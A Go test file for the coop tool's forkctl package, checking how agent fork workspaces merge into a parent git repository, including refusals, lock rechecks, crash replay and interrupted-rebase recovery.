package forkctl

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/AndrewDryga/coop/internal/config"
	"github.com/AndrewDryga/coop/internal/forkspace"
	"github.com/AndrewDryga/coop/internal/project"
	"github.com/AndrewDryga/coop/internal/runtime"
	"github.com/AndrewDryga/coop/internal/tasks"
)

// A missing <name> (without --all) is a usage error (exit 2), reported before the dirty-tree /
// non-interactive environment gates — so the user sees the real problem, not "uncommitted changes".
func TestForkMergeRequiresName(t *testing.T) {
	c := &Control{cfg: &config.Config{}}
	if code, err := c.ForkMerge(nil); code != 2 || err == nil || !strings.Contains(err.Error(), "usage") {
		t.Errorf("ForkMerge(nil) = (%d, %v), want (2, usage error)", code, err)
	}
	if code, err := c.ForkMerge([]string{"--nope"}); code != 2 || err == nil {
		t.Errorf("ForkMerge(--nope) = (%d, %v), want (2, unknown-flag error)", code, err)
	}
	if code, err := c.ForkMerge([]string{"perf", "--all", "--yes"}); code != 2 || err == nil || !strings.Contains(err.Error(), "mutually exclusive") {
		t.Errorf("ForkMerge(perf --all --yes) = (%d, %v), want (2, mutually-exclusive error)", code, err)
	}
}

func TestForkMergePreflightsUnsupportedStateBeforeEnvironmentGates(t *testing.T) {
	for _, args := range [][]string{{"old", "--yes"}, {"--all", "--yes"}} {
		t.Run(strings.Join(args, "_"), func(t *testing.T) {
			repo := initRepo(t)
			if _, err := forkspace.Setup(repo, "old"); err != nil {
				t.Fatal(err)
			}
			if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
				t.Fatal(err)
			}
			raw := []byte("owner-v3\nopaque\n")
			path := forkspace.PidPath(repo, "old")
			if err := os.WriteFile(path, raw, 0o644); err != nil {
				t.Fatal(err)
			}
			runtimeCalls := 0
			c := &Control{
				cfg: &config.Config{RepoOverride: repo, Gate: []string{"true"}},
				host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
					runtimeCalls++
					return runtime.Runtime{}, errors.New("runtime must not be consulted")
				}},
			}
			code, err := c.ForkMerge(args) // --yes lets a missing preflight reach the configured runtime gate
			if code != 1 || err == nil || !strings.Contains(err.Error(), "unsupported detached-worker state version") || strings.Contains(err.Error(), "--yes") {
				t.Fatalf("ForkMerge(%v) unsupported state = (%d, %v), want pre-gate version refusal", args, code, err)
			}
			if got, readErr := os.ReadFile(path); readErr != nil || string(got) != string(raw) {
				t.Fatalf("unsupported state changed = %q, %v; want exact %q", got, readErr, raw)
			}
			if runtimeCalls != 0 {
				t.Fatalf("unsupported merge resolved its runtime %d time(s)", runtimeCalls)
			}
		})
	}
}

func TestForkMergeAllRejectsBrokenForkRootBeforeRuntime(t *testing.T) {
	repo := initRepo(t)
	if err := os.WriteFile(forkspace.Home(repo), []byte("not a directory"), 0o644); err != nil {
		t.Fatal(err)
	}
	runtimeCalls := 0
	c := &Control{
		cfg: &config.Config{RepoOverride: repo, Gate: []string{"true"}},
		host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
			runtimeCalls++
			return runtime.Runtime{}, nil
		}},
	}
	code, err := c.ForkMerge([]string{"--all", "--yes"})
	if code != -1 || err == nil || !strings.Contains(err.Error(), forkspace.Home(repo)) {
		t.Fatalf("ForkMerge(--all) = (%d, %v), want fork discovery error", code, err)
	}
	if runtimeCalls != 0 {
		t.Fatalf("broken fork discovery resolved runtime %d time(s)", runtimeCalls)
	}
}

func TestForkMergeRunningRefusalKeepsLifecycleExitClass(t *testing.T) {
	repo := initRepo(t)
	if _, err := forkspace.Setup(repo, "busy"); err != nil {
		t.Fatal(err)
	}
	if err := forkspace.WritePid(repo, "busy", os.Getpid()); err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	code, err := c.ForkMerge([]string{"busy", "--yes"})
	if code != 1 || err == nil || !strings.Contains(err.Error(), "running or awaiting cleanup") {
		t.Fatalf("ForkMerge(running) = (%d, %v), want lifecycle refusal class 1", code, err)
	}
}

func TestForkMergeRejectsInvalidProjectBeforeRuntimeOrMutation(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "invalid-policy")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agent"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, project.File), []byte("gate: [\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", project.File)
	git(t, repo, "commit", "-qm", "invalid project policy")
	parentHead, forkHead := gitOut(repo, "rev-parse", "HEAD"), gitOut(ws, "rev-parse", "HEAD")
	runtimeCalls := 0
	c := &Control{
		cfg: &config.Config{RepoOverride: repo},
		host: Host{EnsureRuntime: func() (runtime.Runtime, error) {
			runtimeCalls++
			return runtime.Runtime{}, nil
		}},
	}
	code, err := c.ForkMerge([]string{"invalid-policy", "--yes"})
	if code != -1 || err == nil || !strings.Contains(err.Error(), project.File) {
		t.Fatalf("ForkMerge = (%d, %v), want policy error", code, err)
	}
	if runtimeCalls != 0 {
		t.Fatalf("invalid project resolved runtime %d time(s)", runtimeCalls)
	}
	if got := gitOut(repo, "rev-parse", "HEAD"); got != parentHead {
		t.Fatalf("parent HEAD changed: %s -> %s", parentHead, got)
	}
	if got := gitOut(ws, "rev-parse", "HEAD"); got != forkHead {
		t.Fatalf("fork HEAD changed: %s -> %s", forkHead, got)
	}
}

func TestForkMergeRefusesLegacyCopiedTaskQueue(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "legacy-tasks")
	if err != nil {
		t.Fatal(err)
	}
	writeTaskFile(t, filepath.Join(ws, tasks.TasksRoot, tasks.StateTodo, "copied", "task.md"), "# Copied task\n")
	parentBefore := gitOut(repo, "rev-parse", "HEAD")
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	landed, err := mergeOneForTest(t, c, repo, "", "legacy-tasks", false)
	if err == nil || landed || !strings.Contains(err.Error(), "legacy copied task queue") {
		t.Fatalf("legacy copied queue merge = landed %v err %v", landed, err)
	}
	if got := gitOut(repo, "rev-parse", "HEAD"); got != parentBefore {
		t.Fatalf("legacy copied queue moved parent from %s to %s", parentBefore, got)
	}
	if !pathExists(filepath.Join(ws, tasks.TasksRoot, tasks.StateTodo, "copied", "task.md")) {
		t.Fatal("legacy merge refusal removed copied task evidence")
	}
}

func TestRemoteSessionReservationBlocksMergeAndRemovalEvenWithForce(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "session-owned")
	if err != nil {
		t.Fatal(err)
	}
	unlock, err := forkspace.LockState(repo, "session-owned")
	if err != nil {
		t.Fatal(err)
	}
	identity, err := forkspace.EnsureGenerationLocked(repo, "session-owned")
	if err == nil {
		err = forkspace.ReserveWorkspaceLocked(repo, forkspace.WorkspaceReservation{
			Version: forkspace.WorkspaceReservationVersion, Fork: identity,
			Kind: forkspace.WorkspaceReservationRemoteSession, OwnerID: "remote_session_test", CreatedAt: time.Now().UTC(),
		})
	}
	unlock()
	if err != nil {
		t.Fatal(err)
	}
	if mergeUnlock, err := lockForkForMerge(repo, "session-owned"); err == nil {
		mergeUnlock()
		t.Fatal("merge acquired a remote-session-owned workspace")
	} else if !strings.Contains(err.Error(), "remote-session") {
		t.Fatalf("merge reservation refusal = %v", err)
	}
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	if code, err := c.ForkRm([]string{"session-owned", "--force", "--yes"}); code != 1 || err == nil || !strings.Contains(err.Error(), "remote-session") {
		t.Fatalf("forced rm of reserved workspace = (%d, %v)", code, err)
	}
	if !pathExists(ws) {
		t.Fatal("forced rm deleted a remote-session-owned workspace")
	}
}

func TestForkMergeRechecksUnsupportedStateUnderLifecycleLock(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "race")
	if err != nil {
		t.Fatal(err)
	}
	head := gitOut(repo, "rev-parse", "HEAD")
	raw := []byte("owner-v3\nopaque\n")
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	got := runForkCommandAcrossLockedMutation(t, repo, "race", func() (int, error) {
		return c.ForkMerge([]string{"race", "--yes"})
	}, func() {
		if err := os.WriteFile(forkspace.PidPath(repo, "race"), raw, 0o644); err != nil {
			t.Fatal(err)
		}
	})
	if got.code == 0 || got.err == nil || !strings.Contains(got.err.Error(), "unsupported detached-worker state version") {
		t.Fatalf("ForkMerge after state replacement = (%d, %v), want locked version refusal", got.code, got.err)
	}
	if gitOut(repo, "rev-parse", "HEAD") != head || !pathExists(ws) {
		t.Fatal("merge mutated the parent or workspace after unsupported state appeared")
	}
	if data, readErr := os.ReadFile(forkspace.PidPath(repo, "race")); readErr != nil || string(data) != string(raw) {
		t.Fatalf("unsupported state changed = %q, %v; want exact %q", data, readErr, raw)
	}
}

func TestDestroyLandedForkRechecksUnsupportedStateUnderLifecycleLock(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "landed")
	if err != nil {
		t.Fatal(err)
	}
	c := &Control{cfg: &config.Config{}}
	result, err := c.mergeOne(repo, "", "landed", false)
	t.Cleanup(result.approval.close)
	if err != nil || result.approval == nil {
		t.Fatalf("land: %v", err)
	}
	raw := []byte("owner-v3\nopaque\n")
	got := runForkCommandAcrossLockedMutation(t, repo, "landed", func() (int, error) {
		if err := destroyLandedFork(runtime.Runtime{}, repo, "landed", result.approval); err != nil {
			return 1, err
		}
		return 0, nil
	}, func() {
		if err := os.WriteFile(forkspace.PidPath(repo, "landed"), raw, 0o644); err != nil {
			t.Fatal(err)
		}
	})
	if got.code != 1 || got.err == nil || !strings.Contains(got.err.Error(), "unsupported detached-worker state version") {
		t.Fatalf("destroy after state replacement = (%d, %v), want locked version refusal", got.code, got.err)
	}
	if !pathExists(ws) {
		t.Fatal("post-land cleanup deleted a workspace with unsupported state")
	}
}

func TestMergeOneNoGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}} // no COOP_GATE → no box needed

	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's file")
	}
}

// A legacy Coop-Task trailer is not canonical task authority. New fork assignments land only from
// an exact generation candidate, so a Git-only fork remains a Git-only merge even if config points
// at an unusable task path.
func TestMergeOneDoesNotInferTaskCompletionFromTrailer(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	// A tasks path outside the repo: coop cannot work out which queues the land should reconcile.
	c := &Control{cfg: &config.Config{TasksFiles: []string{filepath.Join(t.TempDir(), "elsewhere")}}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work\n\nCoop-Task: t1")

	landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
	if !landed || err != nil {
		t.Fatalf("mergeOne = (%v, %v), want Git-only land", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("Git-only trailer merge did not land")
	}
}

func prepareForkTaskCandidate(t *testing.T, name string) (string, string, string, forkspace.Identity, *Control) {
	t.Helper()
	repo := initRepo(t)
	root := filepath.Join(repo, tasks.TasksRoot)
	if err := tasks.ScaffoldStateDirs(root); err != nil {
		t.Fatal(err)
	}
	taskDir := filepath.Join(root, tasks.StateTodo, "canonical-task")
	if err := os.MkdirAll(taskDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(taskDir, "task.md"), []byte("# Canonical task\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	ws, err := forkspace.Setup(repo, name)
	if err != nil {
		t.Fatal(err)
	}
	unlock, err := forkspace.LockState(repo, name)
	if err != nil {
		t.Fatal(err)
	}
	identity, err := forkspace.EnsureGenerationLocked(repo, name)
	unlock()
	if err != nil {
		t.Fatal(err)
	}
	assignment, err := tasks.AssignForkTask([]string{root}, tasks.ForkAssignmentRequest{
		AuthorityRepo: repo, Fork: identity, WorkspaceRoot: ws,
		BaselineHead: gitOut(ws, "rev-parse", "HEAD"),
		LeaseOwner:   tasks.TaskLeaseOwner{RunID: "test", PID: os.Getpid(), Provider: "codex", Target: "codex"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := assignment.Lease.Release(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("landed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "feature.txt")
	git(t, ws, "commit", "-qm", "implement canonical task\n\nCoop-Task: canonical-task")
	projected, ok := mustCurrentTask(t, assignment.Owner.Projection, "canonical-task")
	if !ok {
		t.Fatal("projected task missing")
	}
	if err := tasks.MoveTaskDir(assignment.Owner.Projection, projected, tasks.StateDone); err != nil {
		t.Fatal(err)
	}
	if _, err := tasks.AcceptForkProjection(repo, root, "canonical-task", assignment.Owner); err != nil {
		t.Fatal(err)
	}
	if _, published, err := tasks.PublishForkCandidate(repo, identity, gitOut(ws, "rev-parse", "HEAD"), gitOut(ws, "rev-parse", "HEAD^{tree}")); err != nil || !published {
		t.Fatalf("publish task candidate: published=%v err=%v", published, err)
	}
	c := &Control{cfg: &config.Config{ConfigDir: t.TempDir()}}
	return repo, ws, root, identity, c
}

func TestMergeOneLandsExactCandidateAndCanonicalTask(t *testing.T) {
	repo, _, root, identity, c := prepareForkTaskCandidate(t, "task-land")
	landed, err := mergeOneForTest(t, c, repo, "", identity.Name, false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v)", landed, err)
	}
	if data, err := os.ReadFile(filepath.Join(repo, "feature.txt")); err != nil || string(data) != "landed\n" {
		t.Fatalf("landed Git content = %q, %v", data, err)
	}
	item, ok := mustCurrentTask(t, root, "canonical-task")
	if !ok || item.State != tasks.StateDone {
		t.Fatalf("canonical task after land = %+v, ok=%v", item, ok)
	}
	if active, err := tasks.ForkTaskState(repo, identity); err != nil || active {
		t.Fatalf("fork task authority after land = %v, %v", active, err)
	}
	if _, ok, err := readLandIntent(repo, identity); err != nil || ok {
		t.Fatalf("land intent after completion = ok %v err %v", ok, err)
	}
}

func TestMergeOneReplaysCrashAfterParentFastForward(t *testing.T) {
	repo, _, root, identity, c := prepareForkTaskCandidate(t, "task-crash")
	c.afterLandFastForward = func() error { return errors.New("injected crash after parent fast-forward") }
	landed, err := mergeOneForTest(t, c, repo, "", identity.Name, false)
	if !landed || err == nil || !strings.Contains(err.Error(), "injected crash") {
		t.Fatalf("first merge = (%v, %v), want landed crash", landed, err)
	}
	item, _ := mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateInProgress {
		t.Fatalf("canonical task finalized before journal replay: %s", item.State)
	}
	c.afterLandFastForward = nil
	landed, err = mergeOneForTest(t, c, repo, "", identity.Name, false)
	if err != nil || !landed {
		t.Fatalf("replayed merge = (%v, %v)", landed, err)
	}
	item, _ = mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateDone {
		t.Fatalf("canonical task after replay = %s", item.State)
	}
}

func TestTaskCandidateMergeRecoversWhenParentMovesDuringGate(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-parent-move")
	c.gateOK = func(_, _, _ string) bool {
		if err := os.WriteFile(filepath.Join(repo, "hotfix.txt"), []byte("urgent\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, repo, "add", "hotfix.txt")
		git(t, repo, "commit", "-qm", "concurrent hotfix")
		return true
	}
	landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "candidate restored") {
		t.Fatalf("merge across moved parent = (%v, %v)", landed, err)
	}
	if gitOut(ws, "rev-parse", "HEAD") == "" {
		t.Fatal("candidate workspace was not restored")
	}
	intent, ok, err := readLandIntent(repo, identity)
	if err != nil || !ok || intent.Phase != landPreparing || intent.RebasedHead != "" || intent.ParentBefore != gitOut(repo, "rev-parse", "HEAD") {
		t.Fatalf("retryable land intent = %+v, ok=%v err=%v", intent, ok, err)
	}
	item, _ := mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateInProgress {
		t.Fatalf("canonical task finalized before retry: %s", item.State)
	}
	c.gateOK = func(_, _, _ string) bool { return true }
	landed, err = mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if !landed || err != nil {
		t.Fatalf("retried merge = (%v, %v)", landed, err)
	}
	item, _ = mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateDone || !pathExists(filepath.Join(repo, "hotfix.txt")) || !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Fatalf("retried land lost work: task=%s", item.State)
	}
}

func TestTaskCandidateMergeReplaysCrashAfterRedGateRestoresWorkspace(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-red-gate-crash")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	c.gateOK = func(_, _, _ string) bool { return false }
	c.afterLandCandidateRestore = func() error { return errors.New("injected crash after candidate restore") }
	landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "injected crash") {
		t.Fatalf("crashed red-gate merge = (%v, %v)", landed, err)
	}
	if got := gitOut(ws, "rev-parse", "HEAD"); got != candidate.Head {
		t.Fatalf("workspace HEAD after restore = %s, want %s", got, candidate.Head)
	}
	intent, pending, err := readLandIntent(repo, identity)
	if err != nil || !pending || intent.Phase != landRestoring {
		t.Fatalf("restoring journal = %+v, pending=%v err=%v", intent, pending, err)
	}
	c.afterLandCandidateRestore = nil
	landed, err = mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "candidate restored") {
		t.Fatalf("restored red-gate replay = (%v, %v)", landed, err)
	}
	if _, pending, err := readLandIntent(repo, identity); err != nil || pending {
		t.Fatalf("restored red-gate journal remains: pending=%v err=%v", pending, err)
	}
	item, _ := mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateInProgress {
		t.Fatalf("red-gate replay finalized canonical task: %s", item.State)
	}
	c.gateOK = func(_, _, _ string) bool { return true }
	landed, err = mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if !landed || err != nil {
		t.Fatalf("green retry after restored red gate = (%v, %v)", landed, err)
	}
}

// TestMergeOneRebasesNamedBranch (M3): landing rebases the fork's OWN branch by name, even if the
// agent left a different branch checked out in the ws. With the parent moved forward, a non-rebased
// branch wouldn't fast-forward — so a clean land here proves `name` (not the stray branch) was rebased.
func TestMergeOneRebasesNamedBranch(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	// The fork's real work, committed on its branch "perf".
	if err := os.WriteFile(filepath.Join(ws, "wanted.txt"), []byte("real work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "perf work")
	// The parent moves forward, so a non-rebased branch could not fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "parent.txt"), []byte("moved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves on")
	// The agent wanders off onto a different branch in the ws.
	git(t, ws, "checkout", "-q", "-b", "stray")
	if err := os.WriteFile(filepath.Join(ws, "stray.txt"), []byte("not this\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "stray work")

	landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil) — it must rebase the named branch", landed, err)
	}
	if !pathExists(filepath.Join(repo, "wanted.txt")) {
		t.Error("did not land the fork's named-branch work")
	}
	if pathExists(filepath.Join(repo, "stray.txt")) {
		t.Error("wrongly landed the stray checked-out branch")
	}
}

func TestMergeOneConflictRollsBack(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}

	ws, err := forkspace.Setup(repo, "a")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	// Fork and parent edit the same line → a merge conflict.
	if err := os.WriteFile(filepath.Join(ws, "README.md"), []byte("fork-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "commit", "-aqm", "fork edit")
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("parent-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "commit", "-aqm", "parent edit")

	landed, err := mergeOneForTest(t, c, repo, "", "a", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want (false, error)", landed, err)
	}
	// The conflicted merge must be fully aborted: tree clean, parent content intact.
	if gitDirty(repo) {
		t.Error("working tree left dirty after a conflicted merge")
	}
	if data, _ := os.ReadFile(filepath.Join(repo, "README.md")); string(data) != "parent-version\n" {
		t.Errorf("README.md = %q, want %q", data, "parent-version\n")
	}
}

// A coop killed mid-land (host crash, SIGKILL) leaves git's rebase state in the fork's clone, and
// every later merge used to die on it. The next merge recovers it — but only when nobody could still
// own that worktree, because `rebase --abort` resets it.
func TestMergeRecoversInterruptedRebase(t *testing.T) {
	t.Run("abandoned worktree recovers and the fork lands", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		c := &Control{cfg: &config.Config{}}
		landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
		if !landed || err != nil {
			t.Fatalf("mergeOne over leftover rebase state = (%v, %v), want the merge to recover and land", landed, err)
		}
		if data, _ := os.ReadFile(filepath.Join(repo, "feature.txt")); string(data) != "work\n" {
			t.Errorf("landed feature.txt = %q, want the fork's own work", data)
		}
		if left := leftoverRebaseState(ws); left != "" {
			t.Errorf("rebase state %q survived the merge", left)
		}
		if branch := gitBranch(ws); branch != "perf" {
			t.Errorf("fork left on branch %q, want perf restored by the abort", branch)
		}
	})

	t.Run("provably dead owner recovers", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		// A worker state whose pid the kernel answers ESRCH for: nothing can be running.
		if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := forkspace.WriteWorkerState(repo, "perf", forkspace.WorkerState{Pid: 2147483646, Token: "linux-proc-v1:1:2"}); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		if err := c.rebaseForkOntoParent(repo, ws, "perf"); err != nil {
			t.Fatalf("rebase over a dead owner's leftover state = %v, want recovery", err)
		}
		if left := leftoverRebaseState(ws); left != "" {
			t.Errorf("rebase state %q survived the recovery", left)
		}
		// The recovery let the real rebase run: the fork's commit now sits on the parent's HEAD.
		if base, head := gitOut(ws, "rev-parse", "perf~1"), gitOut(repo, "rev-parse", "HEAD"); base != head {
			t.Errorf("perf~1 = %q, want the parent HEAD %q", base, head)
		}
	})

	t.Run("live owner refuses", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		// mergeOne refuses any fork with lifecycle state well before this, so drive the rebase
		// directly: the recovery must guard its own destructive abort, not lean on that check.
		if err := forkspace.WritePid(repo, "perf", os.Getpid()); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		err := c.rebaseForkOntoParent(repo, ws, "perf")
		if err == nil || !strings.Contains(err.Error(), strconv.Itoa(os.Getpid())) || !strings.Contains(err.Error(), "coop fork stop perf") {
			t.Fatalf("rebase over a live owner's leftover state = %v, want a refusal naming pid %d", err, os.Getpid())
		}
		if leftoverRebaseState(ws) == "" {
			t.Error("a refused recovery still aborted the live owner's rebase")
		}
	})

	t.Run("unverifiable owner refuses", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		if err := forkspace.WritePid(repo, "perf", os.Getpid()); err != nil {
			t.Fatal(err)
		}
		oldRead := forkspace.ReadProcStartToken
		forkspace.ReadProcStartToken = func(int) string { return "" } // liveness undecidable, so nothing is provable
		t.Cleanup(func() { forkspace.ReadProcStartToken = oldRead })
		c := &Control{cfg: &config.Config{}}
		err := c.rebaseForkOntoParent(repo, ws, "perf")
		if err == nil || !strings.Contains(err.Error(), "coop fork stop perf") {
			t.Fatalf("rebase over an unverifiable owner = %v, want a fail-closed refusal", err)
		}
		if leftoverRebaseState(ws) == "" {
			t.Error("a refused recovery still aborted an unverifiable owner's rebase")
		}
	})

	t.Run("an abort that fails surfaces the manual recovery", func(t *testing.T) {
		if _, err := exec.LookPath("git"); err != nil {
			t.Skip("git not available")
		}
		repo := initRepo(t)
		ws, err := forkspace.Setup(repo, "perf")
		if err != nil {
			t.Fatalf("forkspace.Setup: %v", err)
		}
		// State git itself cannot abort: an am-backend directory with no rebase behind it.
		if err := os.Mkdir(filepath.Join(ws, ".git", "rebase-apply"), 0o755); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		if err := c.rebaseForkOntoParent(repo, ws, "perf"); err == nil ||
			!strings.Contains(err.Error(), "could not abort") || !strings.Contains(err.Error(), ws) {
			t.Fatalf("failed abort = %v, want a loud error carrying git's reason and the manual recovery", err)
		}
	})
}

// forkWithInterruptedRebase builds a parent and a fork whose clone was left mid-rebase, exactly as a
// coop killed during a land leaves it: git's state directory present, the fork's commit unlanded.
func forkWithInterruptedRebase(t *testing.T) (string, string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	// The parent moves on, so a land can only succeed if the fork was really rebased onto it.
	if err := os.WriteFile(filepath.Join(repo, "parent.txt"), []byte("moved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves on")
	// Strand a real rebase: replaying the fork's commit onto a sibling that touched the same file
	// conflicts, so git stops and leaves its state directory behind — no synthetic dir.
	git(t, ws, "checkout", "-q", "-b", "sibling", "perf~1")
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("sibling\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "sibling work")
	// Strand it the way a killed coop would: through the trusted git view, where coop's own
	// rebases keep their state (a later coop process finds it there and aborts it).
	rebase, err := forkspace.GitCommand(context.Background(), ws, "rebase", "sibling", "perf")
	if err != nil {
		t.Fatal(err)
	}
	if out, err := rebase.CombinedOutput(); err == nil {
		t.Fatalf("fixture: the rebase was meant to conflict:\n%s", out)
	}
	if leftoverRebaseState(ws) == "" {
		t.Fatal("fixture: git left no rebase state behind")
	}
	return repo, ws
}

// TestMergeOneAbortsWhenParentMovesDuringGate is the core of the CAS fix: if a commit lands on the
// parent WHILE the gate runs, the fast-forward-only merge must refuse — landing nothing and leaving
// the concurrent commit intact — instead of a reset --hard erasing it. The gate seam injects the
// concurrent commit to open that window deterministically.
func TestMergeOneAbortsWhenParentMovesDuringGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	// The gate "passes", but a concurrent commit lands on the parent while it runs.
	c.gateOK = func(_, _, _ string) bool {
		if err := os.WriteFile(filepath.Join(repo, "hotfix.txt"), []byte("urgent\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, repo, "add", "-A")
		git(t, repo, "commit", "-qm", "concurrent hotfix")
		return true
	}
	landed, err := mergeOneForTest(t, c, repo, "gate-img", "perf", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want abort — the parent moved during the gate", landed, err)
	}
	// The concurrent commit survives (not erased), and the fork did NOT land.
	if !pathExists(filepath.Join(repo, "hotfix.txt")) {
		t.Error("the concurrent commit was erased — reset --hard regression")
	}
	if pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("the fork landed onto a moved parent — the CAS did not refuse")
	}
}

// TestMergeOneGateFailLeavesParentUntouched: a red gate never mutates the parent — nothing to roll
// back — because the gate runs on the candidate (the fork clone), not the live parent.
func TestMergeOneGateFailLeavesParentUntouched(t *testing.T) {
